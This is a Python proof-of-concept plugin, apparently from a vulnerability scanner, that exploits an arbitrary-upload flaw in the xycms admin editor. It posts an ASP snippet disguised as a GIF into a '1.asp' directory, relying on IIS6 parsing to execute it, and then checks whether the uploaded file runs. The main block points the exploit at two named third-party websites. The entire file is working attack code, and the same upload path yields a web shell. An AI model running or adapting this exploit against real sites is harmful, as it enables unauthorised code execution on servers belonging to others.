#!/usr/bin/env python
#_refer_= http://www.wooyun.org/bugs/wooyun-2014-077161
# -*- coding: utf-8 -*-
#__Service_ = xycms
#___name___ = xycms-iis6-getshell

import re

def assign(service, arg):
    if service == "xycms":
        return True, arg

def audit(arg):
    xycms(arg)

def xycms(host):
    url_noheader = host[7:]
    path = url_noheader + 'admin/xyeWebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=1.asp'
    payload = '-----------------------------20537215486483\r\n'
    payload += 'Content-Disposition: form-data; name="uploadfile"; filename="1.gif"\r\n'
    payload += 'Content-Type: image/gif\r\n\r\n'
    payload += '<%response.write("ok")%>\r\n\r\n\r\n'
    payload += '-----------------------------20537215486483--\r\n'
    payload_len = len(payload)
    head = "Content-Type: multipart/form-data; boundary=----20537215486483\r\n"
    head += "Connection: Close\r\n"
    head += "Content-Length: %d" % payload_len + '\r\n\r\n'
    code, head, body, ecode, redirct_url = curl.curl('-H \'%s\' -d \'%s\' %s' % (head, payload, path))
    if code == 200:
        shell = re.findall("Saved\(\'(.+?.gif)",body)
        if shell:
            aspurl = util.urljoin(host, '../'+shell[0])
            code, head, body, ecode, redirect_url = curl.curl(aspurl)
            if code==200:
                security_hole('upload vulnerable:%s' % aspurl)
            else:
                security_info('maybe vulnerable:%s' % aspurl)
    
if __name__ == "__main__":
    from dummy import *
    audit(assign('xycms', 'http://www.xianclass.com/')[1])
    audit(assign('xycms', 'http://www.yjcjy.com/')[1])